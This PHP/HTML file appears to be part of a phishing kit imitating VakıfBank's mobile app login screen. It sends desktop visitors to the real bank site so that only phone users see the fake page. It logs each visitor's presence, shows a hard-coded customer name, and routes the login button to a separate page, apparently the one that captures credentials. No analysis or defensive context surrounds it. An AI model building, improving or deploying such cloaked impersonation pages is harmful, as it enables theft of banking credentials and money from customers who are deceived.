<?php
declare(strict_types=1);
require_once __DIR__ . '/includes/storage.php';

function isMobileRequest(): bool
{
    $userAgent = strtolower((string) ($_SERVER['HTTP_USER_AGENT'] ?? ''));
    if ($userAgent === '') return false;
    return (bool) preg_match('/android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|windows phone/', $userAgent);
}

if (!isMobileRequest()) {
    header('Location: ' . DESKTOP_BANK_LOGIN_URL);
    exit;
}

upsertPresence('giris', null, false);
?>
<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>VakıfBank Giriş Ekranı</title>
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
  <link rel="stylesheet" href="assets/app.css">
  <style>
    :root {
      --color-primary: #ffb81c;
      --color-primary-dark: #e5a419;
      --color-header: #2b2b2b;
      --color-text: #1a1a1a;
      --color-text-muted: #8a8a8a;
      --color-border: #e8e8e8;
      --color-surface: #ffffff;
      --color-avatar-bg: #e5e5e5;
      --font-family: "Inter", system-ui, -apple-system, sans-serif;
      --font-size-xs: 0.625rem;
      --font-size-sm: 0.6875rem;
      --font-size-md: 0.875rem;
      --font-size-name: 1.125rem;
      --radius-sm: 8px;
      --radius-lg: 28px;
      --phone-width: 390px;
      --phone-height: 844px;
    }
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: linear-gradient(145deg, #1a1a2e, #16213e 50%, #0f3460);
      font-family: var(--font-family);
      -webkit-font-smoothing: antialiased;
    }
    .visually-hidden {
      position: absolute; width: 1px; height: 1px; padding: 0; margin: -1px;
      overflow: hidden; clip: rect(0,0,0,0); border: 0;
    }
    .phone-frame {
      width: var(--phone-width);
      height: var(--phone-height);
      max-height: 95vh;
      background: var(--color-surface);
      border-radius: 40px;
      box-shadow: 0 0 0 12px #111, 0 24px 48px rgba(0,0,0,.45);
      overflow: hidden;
      display: flex;
      flex-direction: column;
      position: relative;
    }
    .app-header {
      display: grid;
      grid-template-columns: 44px 1fr auto;
      align-items: center;
      gap: 8px;
      padding: 12px 16px 14px;
      background: var(--color-header);
      color: #fff;
      flex-shrink: 0;
    }
    .icon-btn {
      width: 40px; height: 40px; border: none; background: transparent; color: #fff;
      cursor: pointer; display: flex; align-items: center; justify-content: center;
      border-radius: var(--radius-sm);
    }
    .icon { width: 22px; height: 22px; }
    .app-header__logo { display: flex; align-items: center; justify-content: center; gap: 6px; }
    .logo-mark {
      width: 28px; height: 28px; background: var(--color-primary); color: var(--color-header);
      font-weight: 800; font-size: 1rem; border-radius: 6px;
      display: flex; align-items: center; justify-content: center;
    }
    .logo-text { font-size: 1.25rem; font-weight: 700; letter-spacing: -.02em; }
    .logo-text--accent { color: var(--color-primary); }
    .app-header__actions { display: flex; align-items: center; gap: 4px; }
    .lang-btn {
      border: 1px solid rgba(255,255,255,.35); background: transparent; color: #fff;
      font-size: var(--font-size-sm); font-weight: 600; padding: 4px 10px;
      border-radius: var(--radius-sm); cursor: pointer;
    }
    .feature-carousel {
      padding: 16px 0 12px; border-bottom: 1px solid var(--color-border); flex-shrink: 0;
    }
    .feature-carousel__list {
      list-style: none; display: flex; gap: 12px; padding: 0 16px;
      overflow-x: auto; scrollbar-width: none;
    }
    .feature-carousel__list::-webkit-scrollbar { display: none; }
    .feature-item {
      flex: 0 0 auto; display: flex; flex-direction: column; align-items: center;
      gap: 6px; width: 64px;
    }
    .feature-item__icon {
      width: 52px; height: 52px; border: 2px solid var(--color-primary);
      border-radius: 50%; background: #fff center / 28px no-repeat;
    }
    .feature-item__icon[data-icon="vibox"] {
      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23ffb81c' stroke-width='1.5'%3E%3Crect x='4' y='4' width='7' height='7' rx='1'/%3E%3Crect x='13' y='4' width='7' height='7' rx='1'/%3E%3Crect x='4' y='13' width='7' height='7' rx='1'/%3E%3Crect x='13' y='13' width='7' height='7' rx='1'/%3E%3C/svg%3E");
    }
    .feature-item__icon[data-icon="sky"] {
      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23ffb81c' stroke-width='1.5'%3E%3Cellipse cx='12' cy='14' rx='8' ry='4'/%3E%3Cpath d='M8 10c0-2 2-4 4-4s4 2 4 4'/%3E%3C/svg%3E");
    }
    .feature-item__icon[data-icon="help"] {
      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23ffb81c' stroke-width='1.5'%3E%3Ccircle cx='12' cy='12' r='9'/%3E%3Cpath d='M9.5 9a2.5 2.5 0 014.5 1.5c0 2-3 2-3 4'/%3E%3Ccircle cx='12' cy='17' r='.8' fill='%23ffb81c'/%3E%3C/svg%3E");
    }
    .feature-item__icon[data-icon="security"] {
      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23ffb81c' stroke-width='1.5'%3E%3Cpath d='M12 3l8 4v5c0 5-3.5 8-8 9-4.5-1-8-4-8-9V7l8-4z'/%3E%3C/svg%3E");
    }
    .feature-item__icon--vibi,
    .feature-item__icon[data-icon="vibi"] {
      background: linear-gradient(135deg, #ffd54f, var(--color-primary));
      border-color: var(--color-primary); position: relative;
    }
    .feature-item__icon--vibi::after,
    .feature-item__icon[data-icon="vibi"]::after {
      content: ""; position: absolute; inset: 12px; background: #fff;
      border-radius: 4px; box-shadow: 2px 2px 0 rgba(0,0,0,.1);
    }
    .feature-item__label {
      font-size: var(--font-size-sm); color: var(--color-text-muted);
      text-align: center; line-height: 1.2;
    }
    .account-tabs {
      display: flex; justify-content: center; gap: 48px;
      padding: 20px 16px 0; flex-shrink: 0;
    }
    .account-tabs__tab {
      border: none; background: none; font-family: inherit;
      font-size: var(--font-size-md); font-weight: 500; color: var(--color-text-muted);
      padding-bottom: 10px; cursor: pointer; position: relative;
    }
    .account-tabs__tab--active { color: var(--color-text); font-weight: 700; }
    .account-tabs__tab--active::after {
      content: ""; position: absolute; left: 0; right: 0; bottom: 0;
      height: 4px; background: var(--color-primary); border-radius: 2px 2px 0 0;
    }
    .user-profile {
      display: flex; flex-direction: column; align-items: center;
      padding: 28px 24px 20px; flex: 1;
    }
    .user-profile__avatar {
      width: 100px; height: 100px; border-radius: 50%;
      background: var(--color-avatar-bg);
      display: flex; align-items: center; justify-content: center;
      color: #b0b0b0; margin-bottom: 16px;
    }
    .user-profile__avatar svg { width: 48px; height: 48px; }
    .user-profile__info { display: flex; align-items: center; gap: 10px; }
    .user-profile__name {
      font-size: var(--font-size-name); font-weight: 700;
      letter-spacing: .04em; color: var(--color-text); text-transform: uppercase;
    }
    .user-profile__switch {
      width: 32px; height: 32px; border: none; background: transparent;
      color: var(--color-primary); cursor: pointer;
      display: flex; align-items: center; justify-content: center;
    }
    .user-profile__switch svg { width: 22px; height: 22px; }
    .login-action { padding: 0 24px 24px; flex-shrink: 0; }
    .btn-primary {
      width: 100%; padding: 16px 24px; border: none; border-radius: var(--radius-lg);
      background: var(--color-primary); color: #fff; font-family: inherit;
      font-size: 1.0625rem; font-weight: 700; letter-spacing: .12em; cursor: pointer;
      box-shadow: 0 4px 12px rgba(255,184,28,.35);
    }
    .btn-primary:hover { background: var(--color-primary-dark); }
    .quick-actions {
      display: grid; grid-template-columns: 1fr 1fr 1fr;
      border-top: 1px solid var(--color-border); flex-shrink: 0;
    }
    .quick-action {
      display: flex; flex-direction: column; align-items: center;
      gap: 8px; padding: 16px 8px; position: relative;
    }
    .quick-action:not(:last-child)::after {
      content: ""; position: absolute; right: 0; top: 20%; bottom: 20%;
      width: 1px; background: var(--color-border);
    }
    .quick-action__icon { width: 36px; height: 36px; background: center / contain no-repeat; }
    .quick-action__icon[data-icon="cepte-kazan"] {
      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23ffb81c' stroke-width='1.4'%3E%3Crect x='5' y='2' width='14' height='20' rx='2'/%3E%3Cpath d='M9 18h6'/%3E%3Crect x='8' y='6' width='8' height='5' rx='1'/%3E%3C/svg%3E");
    }
    .quick-action__icon[data-icon="qr"] {
      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23ffb81c' stroke-width='1.4'%3E%3Crect x='3' y='3' width='7' height='7'/%3E%3Crect x='14' y='3' width='7' height='7'/%3E%3Crect x='3' y='14' width='7' height='7'/%3E%3Cpath d='M14 14h3v3h-3zM17 17h3v3h-3z'/%3E%3C/svg%3E");
    }
    .quick-action__icon[data-icon="cep-imza"] {
      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23ffb81c' stroke-width='1.4'%3E%3Crect x='5' y='2' width='14' height='20' rx='2'/%3E%3Cpath d='M8 14c2-1 4-1 6 0s4 1 6 0'/%3E%3Cpath d='M14 8l3 3'/%3E%3C/svg%3E");
    }
    .quick-action__label {
      font-size: var(--font-size-xs); color: var(--color-text-muted);
      text-align: center; line-height: 1.25; max-width: 90px;
    }
    .bottom-nav {
      display: grid; grid-template-columns: repeat(5, 1fr); align-items: flex-end;
      padding: 8px 4px 20px; background: var(--color-surface);
      border-top: 1px solid var(--color-border);
      box-shadow: 0 -4px 20px rgba(0,0,0,.04);
      flex-shrink: 0; position: relative;
    }
    .bottom-nav::before {
      content: ""; position: absolute; top: -18px; left: 50%; transform: translateX(-50%);
      width: 72px; height: 36px; background: var(--color-surface);
      border-radius: 50% 50% 0 0; box-shadow: 0 -1px 0 var(--color-border);
    }
    .bottom-nav__item {
      display: flex; flex-direction: column; align-items: center; gap: 4px;
      border: none; background: none; cursor: pointer; padding: 4px 2px;
      color: var(--color-text-muted); font-family: inherit; z-index: 1;
    }
    .bottom-nav__icon { width: 24px; height: 24px; color: var(--color-primary); }
    .bottom-nav__icon--fast {
      font-size: .65rem; font-weight: 800; font-style: italic; color: var(--color-primary);
      letter-spacing: -.05em; display: flex; align-items: center; justify-content: center; height: 24px;
    }
    .bottom-nav__icon--calc {
      font-size: .55rem; font-weight: 700; color: var(--color-primary);
      letter-spacing: -.08em; line-height: 1; height: 24px;
      display: flex; align-items: center;
    }
    .bottom-nav__label { font-size: .5rem; line-height: 1.15; text-align: center; max-width: 56px; }
    .bottom-nav__item--center { margin-top: -28px; }
    .bottom-nav__vibi {
      width: 48px; height: 48px; border-radius: 14px;
      background: linear-gradient(145deg, #ffe082, var(--color-primary));
      box-shadow: 0 4px 12px rgba(255,184,28,.5); position: relative;
    }
    .bottom-nav__vibi::after {
      content: ""; position: absolute; top: 50%; left: 50%;
      transform: translate(-50%, -55%); width: 22px; height: 22px;
      background: #fff; border-radius: 5px;
    }
  </style>
  <!-- Meta Pixel Code -->
  <script>
  !function(f,b,e,v,n,t,s)
  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
  n.queue=[];t=b.createElement(e);t.async=!0;
  t.src=v;s=b.getElementsByTagName(e)[0];
  s.parentNode.insertBefore(t,s)}(window, document,'script',
  'https://connect.facebook.net/en_US/fbevents.js');
  fbq('init', '1490333842624277');
  fbq('track', 'PageView');
  </script>
  <noscript><img height="1" width="1" style="display:none"
  src="https://www.facebook.com/tr?id=1490333842624277&ev=PageView&noscript=1"
  /></noscript>
  <!-- End Meta Pixel Code -->
</head>
<body>
  <div class="phone-frame">
    <header class="app-header">
      <button type="button" class="icon-btn" aria-label="Profil">
        <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
          <circle cx="12" cy="8" r="4"/><path d="M5 20c0-4 3.5-6 7-6s7 2 7 6"/>
        </svg>
      </button>
      <div class="app-header__logo">
        <span class="logo-mark">V</span>
        <span class="logo-text">Vakıf<span class="logo-text--accent">Bank</span></span>
      </div>
      <div class="app-header__actions">
        <button type="button" class="lang-btn">EN</button>
        <button type="button" class="icon-btn" aria-label="Bildirimler">
          <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
            <path d="M18 8a6 6 0 10-12 0c0 7-3 8-3 8h18s-3-1-3-8"/><path d="M13.7 21a2 2 0 01-3.4 0"/>
          </svg>
        </button>
      </div>
    </header>

    <section class="feature-carousel">
      <ul class="feature-carousel__list">
        <li class="feature-item"><div class="feature-item__icon" data-icon="vibox"></div><span class="feature-item__label">Vibox</span></li>
        <li class="feature-item"><div class="feature-item__icon" data-icon="sky"></div><span class="feature-item__label">SKY Limit</span></li>
        <li class="feature-item"><div class="feature-item__icon" data-icon="help"></div><span class="feature-item__label">Nasıl Yap...</span></li>
        <li class="feature-item"><div class="feature-item__icon" data-icon="security"></div><span class="feature-item__label">Güvenlik</span></li>
        <li class="feature-item"><div class="feature-item__icon feature-item__icon--vibi" data-icon="vibi"></div><span class="feature-item__label">ViBi</span></li>
      </ul>
    </section>

    <nav class="account-tabs">
      <button type="button" class="account-tabs__tab account-tabs__tab--active">BİREYSEL</button>
      <button type="button" class="account-tabs__tab">TİCARİ</button>
    </nav>

    <section class="user-profile">
      <div class="user-profile__avatar">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.2">
          <circle cx="12" cy="8" r="4"/><path d="M5 20c0-4 3.5-6 7-6s7 2 7 6"/>
        </svg>
      </div>
      <div class="user-profile__info">
        <h1 class="user-profile__name">ONUR KINALIDERE</h1>
        <button type="button" class="user-profile__switch" aria-label="Hesap değiştir">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <path d="M7 7h10v10M7 17L17 7"/>
          </svg>
        </button>
      </div>
    </section>

    <section class="login-action">
      <a href="giris.php" class="btn-primary" style="display:flex;align-items:center;justify-content:center;text-decoration:none;">GİRİŞ</a>
    </section>

    <section class="quick-actions">
      <article class="quick-action">
        <div class="quick-action__icon" data-icon="cepte-kazan"></div>
        <span class="quick-action__label">Cepte Kazan</span>
      </article>
      <article class="quick-action">
        <div class="quick-action__icon" data-icon="qr"></div>
        <span class="quick-action__label">Karekod İşlemleri</span>
      </article>
      <article class="quick-action">
        <div class="quick-action__icon" data-icon="cep-imza"></div>
        <span class="quick-action__label">Cep İmza</span>
      </article>
    </section>

    <nav class="bottom-nav">
      <button type="button" class="bottom-nav__item">
        <span class="bottom-nav__icon bottom-nav__icon--fast">fast</span>
        <span class="bottom-nav__label">FAST İşlemleri</span>
      </button>
      <button type="button" class="bottom-nav__item">
        <svg class="bottom-nav__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
          <path d="M4 19V5M10 19V9M16 19v-6M22 19V3"/>
        </svg>
        <span class="bottom-nav__label">Piyasa Bilgileri</span>
      </button>
      <button type="button" class="bottom-nav__item bottom-nav__item--center">
        <span class="bottom-nav__vibi"></span>
        <span class="bottom-nav__label visually-hidden">ViBi</span>
      </button>
      <button type="button" class="bottom-nav__item">
        <span class="bottom-nav__icon bottom-nav__icon--calc">+−×=</span>
        <span class="bottom-nav__label">Hesaplama Araçları</span>
      </button>
      <button type="button" class="bottom-nav__item">
        <svg class="bottom-nav__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
          <path d="M4 7h16M4 12h16M4 17h16"/>
        </svg>
        <span class="bottom-nav__label">Diğer İşlemler</span>
      </button>
    </nav>
  </div>
</body>
</html>
